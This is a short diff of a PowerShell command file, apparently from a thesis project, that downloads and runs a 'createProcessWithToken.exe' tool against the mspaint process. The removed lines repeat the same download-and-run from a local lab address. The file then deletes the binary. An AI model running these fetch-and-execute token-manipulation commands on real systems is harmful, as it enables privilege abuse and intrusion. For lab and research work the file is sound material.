@@ -6,11 +6,6 @@ Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/createPr
 & "$env:USERPROFILE\Downloads\createProcessWithToken.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
 
 
-mspaint
-Invoke-WebRequest -Uri http://192.168.120.6:8000/createProcessWithToken.exe -OutFile "$env:USERPROFILE\Downloads\createProcessWithToken.exe"
-& "$env:USERPROFILE\Downloads\createProcessWithToken.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
-
-
 
 CLEAN UP
 Remove-Item "$env:USERPROFILE\Downloads\createProcessWithToken.exe"
